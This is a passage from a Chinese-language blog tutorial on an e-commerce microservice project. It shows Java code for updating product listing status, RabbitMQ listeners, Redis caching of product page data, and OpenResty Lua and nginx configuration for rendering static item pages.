class_">Jackson2JsonMessageConverter</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>SpuServiceImpl.java:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">  <span class="meta">@Transactional</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateSaleable</span><span class="params">(Long id, Boolean saleable)</span> &#123;</span><br><span class="line">      <span class="comment">// 1.更新SPU</span></span><br><span class="line">      <span class="type">Spu</span> <span class="variable">spu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Spu</span>();</span><br><span class="line">      spu.setId(id);</span><br><span class="line">      spu.setSaleable(saleable);</span><br><span class="line">      <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> updateById(spu);</span><br><span class="line">      <span class="keyword">if</span> (!flag) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">500</span>, <span class="string">&quot;更新上下架信息失败&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 2.更新SKU</span></span><br><span class="line">      flag = skuService.update().eq(<span class="string">&quot;spu_id&quot;</span>, id).set(<span class="string">&quot;saleable&quot;</span>, saleable).update();</span><br><span class="line">      <span class="keyword">if</span> (!flag) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">500</span>, <span class="string">&quot;更新sku上下架信息失败&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 3.发送MQ消息</span></span><br><span class="line">      <span class="type">String</span> <span class="variable">routingKey</span> <span class="operator">=</span> saleable ? BaseMQConstants.RoutingKeyConstants.ITEM_UP_KEY</span><br><span class="line">              : BaseMQConstants.RoutingKeyConstants.ITEM_DOWN_KEY;</span><br><span class="line">      rabbitTemplate.convertAndSend(BaseMQConstants.ExchangeConstants.ITEM_EXCHANGE_NAME, routingKey, id);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h3 id="搜索微服务接受消息"><a href="#搜索微服务接受消息" class="headerlink" title="搜索微服务接受消息"></a>搜索微服务接受消息</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.search.mq;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.search.service.SearchService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.core.ExchangeTypes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.rabbit.annotation.Exchange;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.rabbit.annotation.Queue;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.rabbit.annotation.QueueBinding;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitListener;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseMQConstants.ExchangeConstants.ITEM_EXCHANGE_NAME;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseMQConstants.QueueConstants.SEARCH_ITEM_DOWN;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseMQConstants.QueueConstants.SEARCH_ITEM_UP;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseMQConstants.RoutingKeyConstants.ITEM_DOWN_KEY;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseMQConstants.RoutingKeyConstants.ITEM_UP_KEY;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-05-31 11:54 上午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ItemListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SearchService searchService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ItemListener</span><span class="params">(SearchService searchService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.searchService = searchService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RabbitListener(bindings = @QueueBinding(</span></span><br><span class="line"><span class="meta">            value = @Queue(name = SEARCH_ITEM_UP, durable = &quot;true&quot;),</span></span><br><span class="line"><span class="meta">            exchange = @Exchange(name = ITEM_EXCHANGE_NAME, type = ExchangeTypes.TOPIC),</span></span><br><span class="line"><span class="meta">            key = ITEM_UP_KEY</span></span><br><span class="line"><span class="meta">    ))</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">listenItemUp</span><span class="params">(Long spuId)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(spuId != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">// 新增商品到索引库</span></span><br><span class="line">            searchService.saveGoodsById(spuId);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RabbitListener(bindings = @QueueBinding(</span></span><br><span class="line"><span class="meta">            value = @Queue(name = SEARCH_ITEM_DOWN, durable = &quot;true&quot;),</span></span><br><span class="line"><span class="meta">            exchange = @Exchange(name = ITEM_EXCHANGE_NAME, type = ExchangeTypes.TOPIC),</span></span><br><span class="line"><span class="meta">            key = ITEM_DOWN_KEY</span></span><br><span class="line"><span class="meta">    ))</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">listenItemDown</span><span class="params">(Long spuId)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(spuId != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">// 从索引库删除指定商品</span></span><br><span class="line">            searchService.deleteGoodsById(spuId);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="商品静态页实现（处理高并发请求）"><a href="#商品静态页实现（处理高并发请求）" class="headerlink" title="商品静态页实现（处理高并发请求）"></a>商品静态页实现（处理高并发请求）</h2><h3 id="主要代码："><a href="#主要代码：" class="headerlink" title="主要代码："></a>主要代码：</h3><p>GoodsPageServiceImpl.java:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.page.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.BeanHelper;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.JsonUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.item.client.ItemClient;</span><br><span class="line"><span class="keyword">import</span> com.leyou.item.dto.*;</span><br><span class="line"><span class="keyword">import</span> com.leyou.page.dto.SpecGroupNameDTO;</span><br><span class="line"><span class="keyword">import</span> com.leyou.page.dto.SpecParamNameDTO;</span><br><span class="line"><span class="keyword">import</span> com.leyou.page.service.PageService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.Collectors;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-06-01 2:52 下午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PageServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">PageService</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ItemClient itemClient;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> StringRedisTemplate redisTemplate;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_PREFIX_SPU</span> <span class="operator">=</span> <span class="string">&quot;page:spu:id:&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_PREFIX_SKU</span> <span class="operator">=</span> <span class="string">&quot;page:sku:id:&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_PREFIX_DETAIL</span> <span class="operator">=</span> <span class="string">&quot;page:detail:id:&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_PREFIX_CATEGORY</span> <span class="operator">=</span> <span class="string">&quot;page:category:id:&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_PREFIX_BRAND</span> <span class="operator">=</span> <span class="string">&quot;page:brand:id:&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_PREFIX_SPEC</span> <span class="operator">=</span> <span class="string">&quot;page:spec:id:&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PageServiceImpl</span><span class="params">(ItemClient itemClient, StringRedisTemplate redisTemplate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.itemClient = itemClient;</span><br><span class="line">        <span class="built_in">this</span>.redisTemplate = redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">loadSpuData</span><span class="params">(Long spuId)</span> &#123;</span><br><span class="line">        <span class="type">SpuDTO</span> <span class="variable">spu</span> <span class="operator">=</span> itemClient.querySpuById(spuId);</span><br><span class="line">        <span class="comment">// 组织数据</span></span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;id&quot;</span>, spu.getId());</span><br><span class="line">        map.put(<span class="string">&quot;name&quot;</span>, spu.getName());</span><br><span class="line">        map.put(<span class="string">&quot;categoryIds&quot;</span>, spu.getCategoryIds());</span><br><span class="line">        map.put(<span class="string">&quot;brandId&quot;</span>, spu.getBrandId());</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JsonUtils.toJson(map);</span><br><span class="line">        redisTemplate.opsForValue().set(KEY_PREFIX_SPU + spuId, json);</span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">loadSpuDetailData</span><span class="params">(Long spuId)</span> &#123;</span><br><span class="line">        <span class="type">SpuDetailDTO</span> <span class="variable">spuDetailDTO</span> <span class="operator">=</span> itemClient.querySpuDetailById(spuId);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JsonUtils.toJson(spuDetailDTO);</span><br><span class="line">        redisTemplate.opsForValue().set(KEY_PREFIX_DETAIL + spuId, json);</span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">loadSkuListData</span><span class="params">(Long spuId)</span> &#123;</span><br><span class="line">        <span class="comment">// 查询信息</span></span><br><span class="line">        List&lt;SkuDTO&gt; skuList = itemClient.querySkuBySpuId(spuId);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JsonUtils.toJson(skuList);</span><br><span class="line">        <span class="comment">// 存入redis</span></span><br><span class="line">        redisTemplate.opsForValue().set(KEY_PREFIX_SKU + spuId, json);</span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">loadCategoriesData</span><span class="params">(List&lt;Long&gt; ids)</span> &#123;</span><br><span class="line">        List&lt;CategoryDTO&gt; list = itemClient.queryCategoryByIds(ids);</span><br><span class="line">        List&lt;HashMap&lt;String, Object&gt;&gt; rList = list.stream().map(categoryDTO -&gt; &#123;</span><br><span class="line">            HashMap&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            map.put(<span class="string">&quot;id&quot;</span>, categoryDTO.getId());</span><br><span class="line">            map.put(<span class="string">&quot;name&quot;</span>, categoryDTO.getName());</span><br><span class="line">            <span class="keyword">return</span> map;</span><br><span class="line">        &#125;).collect(Collectors.toList());</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JsonUtils.toJson(rList);</span><br><span class="line">        redisTemplate.opsForValue().set(KEY_PREFIX_CATEGORY + ids.get(ids.size() - <span class="number">1</span>), json);</span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">loadBrandData</span><span class="params">(Long brandId)</span> &#123;</span><br><span class="line"><span class="comment">// 查询信息</span></span><br><span class="line">        <span class="type">BrandDTO</span> <span class="variable">brand</span> <span class="operator">=</span> itemClient.queryBrandById(brandId);</span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;id&quot;</span>, brand.getId());</span><br><span class="line">        map.put(<span class="string">&quot;name&quot;</span>, brand.getName());</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JsonUtils.toJson(map);</span><br><span class="line">        <span class="comment">// 存入Redis</span></span><br><span class="line">        redisTemplate.opsForValue().set(KEY_PREFIX_BRAND + brandId, json);</span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">loadSpecData</span><span class="params">(Long categoryId)</span> &#123;</span><br><span class="line">        List&lt;SpecGroupDTO&gt; list = itemClient.querySpecGroupDetailByCategoryId(categoryId);</span><br><span class="line">        List&lt;SpecGroupNameDTO&gt; collect = list.stream().map(specGroupDTO -&gt; &#123;</span><br><span class="line">            <span class="type">SpecGroupNameDTO</span> <span class="variable">groupNameDTO</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpecGroupNameDTO</span>();</span><br><span class="line">            groupNameDTO.setName(specGroupDTO.getName());</span><br><span class="line">            groupNameDTO.setParams(BeanHelper.copyWithCollection(specGroupDTO.getParams(), SpecParamNameDTO.class));</span><br><span class="line">            <span class="keyword">return</span> groupNameDTO;</span><br><span class="line">        &#125;).collect(Collectors.toList());</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JsonUtils.toJson(collect);</span><br><span class="line">        redisTemplate.opsForValue().set(KEY_PREFIX_SPEC + categoryId, json);</span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Boolean <span class="title function_">deleteSku</span><span class="params">(Long spuId)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> redisTemplate.delete(KEY_PREFIX_SKU + spuId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>item.lua</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 导入模块</span></span><br><span class="line"><span class="keyword">local</span> common = <span class="built_in">require</span>(<span class="string">&quot;common&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> read_redis = common.read_redis  </span><br><span class="line"><span class="keyword">local</span> read_http = common.read_http</span><br><span class="line"><span class="keyword">local</span> cjson = <span class="built_in">require</span>(<span class="string">&quot;cjson&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> template = <span class="built_in">require</span>(<span class="string">&quot;resty.template&quot;</span>)  </span><br><span class="line"><span class="comment">-- 常用变量和方法</span></span><br><span class="line"><span class="keyword">local</span> ngx_log = ngx.<span class="built_in">log</span>  </span><br><span class="line"><span class="keyword">local</span> ngx_ERR = ngx.ERR  </span><br><span class="line"><span class="keyword">local</span> ngx_exit = ngx.<span class="built_in">exit</span>  </span><br><span class="line"><span class="keyword">local</span> ngx_print = ngx.<span class="built_in">print</span>  </span><br><span class="line"><span class="keyword">local</span> ngx_re_match = ngx.re.<span class="built_in">match</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取商品id</span></span><br><span class="line"><span class="keyword">local</span> spuId = ngx.var.spuId</span><br><span class="line"><span class="comment">-- 获取spu</span></span><br><span class="line"><span class="keyword">local</span> spuKey = <span class="string">&quot;page:spu:id:&quot;</span>..spuId </span><br><span class="line"><span class="keyword">local</span> spuInfoStr = read_redis(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, &#123;spuKey&#125;)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> spuInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found spu info, back to http, spuId : &quot;</span>, spuId)  </span><br><span class="line">   spuInfoStr = read_http(<span class="string">&quot;/spu/&quot;</span>..spuId, &#123;&#125;)  </span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> spuInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found spuInfoStr info, spuId : &quot;</span>, spuId)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取sku</span></span><br><span class="line"><span class="keyword">local</span> skuKey = <span class="string">&quot;page:sku:id:&quot;</span>..spuId </span><br><span class="line"><span class="keyword">local</span> skuInfoStr = read_redis(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, &#123;skuKey&#125;)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> skuInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found sku info, back to http, spuId : &quot;</span>, spuId)  </span><br><span class="line">   skuInfoStr = read_http(<span class="string">&quot;/sku/&quot;</span>..spuId, &#123;&#125;)  </span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> skuInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found skuInfoStr info, spuId : &quot;</span>, spuId)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- 获取spuDetail</span></span><br><span class="line"><span class="keyword">local</span> detailKey = <span class="string">&quot;page:detail:id:&quot;</span>..spuId </span><br><span class="line"><span class="keyword">local</span> detailInfoStr = read_redis(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, &#123;detailKey&#125;)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> detailInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found detail info, back to http, spuId : &quot;</span>, spuId)  </span><br><span class="line">   detailInfoStr = read_http(<span class="string">&quot;/detail/&quot;</span>..spuId, &#123;&#125;)  </span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> detailInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found detailInfoStr info, spuId : &quot;</span>, spuId)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- 获取categories</span></span><br><span class="line"><span class="keyword">local</span> spuInfo = cjson.decode(spuInfoStr)  </span><br><span class="line"><span class="keyword">local</span> cid3 = spuInfo[<span class="string">&quot;categoryIds&quot;</span>][<span class="number">3</span>]</span><br><span class="line"><span class="keyword">local</span> categoryKey = <span class="string">&quot;page:category:id:&quot;</span>..cid3 </span><br><span class="line"><span class="keyword">local</span> categoryStr = read_redis(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, &#123;categoryKey&#125;)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> categoryStr <span class="keyword">then</span>  </span><br><span class="line">   <span class="keyword">local</span> idStr = <span class="built_in">table</span>.<span class="built_in">concat</span>(spuInfo[<span class="string">&quot;categoryIds&quot;</span>],<span class="string">&quot;,&quot;</span>);</span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found category info, back to http, categoryIds : &quot;</span>, idStr)  </span><br><span class="line">   categoryStr = read_http(<span class="string">&quot;/categories/&quot;</span>, &#123;ids  = idStr&#125;)</span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> categoryStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found categoryStr info, categoryId : &quot;</span>, cid3)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- 获取品牌  </span></span><br><span class="line"><span class="keyword">local</span> brandId = spuInfo[<span class="string">&quot;brandId&quot;</span>]</span><br><span class="line"><span class="keyword">local</span> brandKey = <span class="string">&quot;page:brand:id:&quot;</span>..brandId </span><br><span class="line"><span class="keyword">local</span> brandStr = read_redis(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, &#123;brandKey&#125;)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> brandStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found brand info, back to http, brandId : &quot;</span>, brandId)  </span><br><span class="line">   brandStr = read_http(<span class="string">&quot;/brand/&quot;</span>..brandId, &#123;&#125;)</span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> brandStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found brandStr info, brandId : &quot;</span>, brandId)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- 获取规格</span></span><br><span class="line"><span class="keyword">local</span> specKey = <span class="string">&quot;page:spec:id:&quot;</span>..cid3 </span><br><span class="line"><span class="keyword">local</span> specStr = read_redis(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, &#123;specKey&#125;)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> specStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found spec info, back to http, cid3 : &quot;</span>, cid3)  </span><br><span class="line">   specStr = read_http(<span class="string">&quot;/spec/&quot;</span>..cid3, &#123;&#125;)</span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> specStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found specStr info, cid3 : &quot;</span>, cid3)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- 组织数据</span></span><br><span class="line"><span class="keyword">local</span> context = &#123;</span><br><span class="line">	name = spuInfo[<span class="string">&quot;name&quot;</span>],</span><br><span class="line">	skuList =  skuInfoStr,</span><br><span class="line">	detail =  detailInfoStr,</span><br><span class="line">	categories =  categoryStr,</span><br><span class="line">	brand =  brandStr,</span><br><span class="line">	specs =  specStr</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">--渲染模板  </span></span><br><span class="line">template.render(<span class="string">&quot;item.html&quot;</span>, context)</span><br></pre></td></tr></table></figure>

<h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><ul>
<li>在Nginx中设置本地缓存，把几乎不变的数据直接存储在nginx内部，例如：<ul>
<li>商品分类数据</li>
<li>品牌数据</li>
<li>规格参数数据</li>
</ul>
</li>
<li>在nginx中对生成的页面做缓存或静态化，做CDN服务，页面不变的时候，减少渲染对CPU的消耗</li>
<li>随着商品数据的日益增多，Redis可能难以支持海量商品信息，此时可以用SSDB来代替，SSDB存储基于磁盘存储，查询性能与Redis差不多，因此可以作为海量数据的缓存库</li>
</ul>
<p>修改nginx.conf,配置本地缓存的大小：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">worker_processes</span>  <span class="number">1</span>;</span><br><span class="line"><span class="attribute">error_log</span> logs/<span class="literal">error</span>.log;</span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span> <span class="number">1024</span>;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">	</span><br><span class="line">    <span class="attribute">lua_package_path</span> <span class="string">&quot;/usr/local/openresty/lualib/?.lua;;&quot;</span>;  <span class="comment">#lua 模块  </span></span><br><span class="line">    <span class="attribute">lua_package_cpath</span> <span class="string">&quot;/usr/local/openresty/lualib/?.so;;&quot;</span>;  <span class="comment">#c模块 </span></span><br><span class="line">    <span class="comment">#本地缓存，名称叫做：item_local_cache，大小50m</span></span><br><span class="line">	<span class="attribute">lua_shared_dict</span> item_local_cache <span class="number">50m</span>; </span><br><span class="line">	</span><br><span class="line">    <span class="attribute">default_type</span>  text/html; <span class="comment"># 默认响应类型是html</span></span><br><span class="line">    <span class="comment">#include lua.conf;    # 引入一个lua.conf文件</span></span><br><span class="line">    <span class="attribute">include</span> leyou.conf;    <span class="comment"># 引入一个leyou.conf文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改common.lua，添加数据查询方法：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 导入redis模块</span></span><br><span class="line"><span class="keyword">local</span> redis = <span class="built_in">require</span>(<span class="string">&quot;resty.redis&quot;</span>) </span><br><span class="line"><span class="comment">-- 配置商品的本地缓存 </span></span><br><span class="line"><span class="keyword">local</span> local_cache = ngx.shared.item_local_cache</span><br><span class="line"><span class="comment">-- 日志</span></span><br><span class="line"><span class="keyword">local</span> ngx_log = ngx.<span class="built_in">log</span>  </span><br><span class="line"><span class="keyword">local</span> ngx_ERR = ngx.ERR</span><br><span class="line"><span class="comment">-- 读取本地缓存</span></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_get</span><span class="params">(key)</span></span>  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> local_cache <span class="keyword">then</span>  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">    <span class="keyword">end</span>  </span><br><span class="line">    <span class="keyword">return</span> local_cache:get(key)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- 写入本地缓存</span></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_set</span><span class="params">(key, value)</span></span>  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> local_cache <span class="keyword">then</span>  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">    <span class="keyword">end</span>  </span><br><span class="line">    <span class="keyword">return</span> local_cache:set(key, value, <span class="number">10</span> * <span class="number">60</span>) <span class="comment">--10分钟  </span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">close_redis</span><span class="params">(red)</span></span>  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> red <span class="keyword">then</span>  </span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    <span class="keyword">end</span>  </span><br><span class="line">    <span class="comment">--释放连接(连接池实现)  </span></span><br><span class="line">    <span class="keyword">local</span> pool_max_idle_time = <span class="number">10000</span> <span class="comment">--毫秒  </span></span><br><span class="line">    <span class="keyword">local</span> pool_size = <span class="number">100</span> <span class="comment">--连接池大小  </span></span><br><span class="line">    <span class="keyword">local</span> ok, err = red:set_keepalive(pool_max_idle_time, pool_size)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span 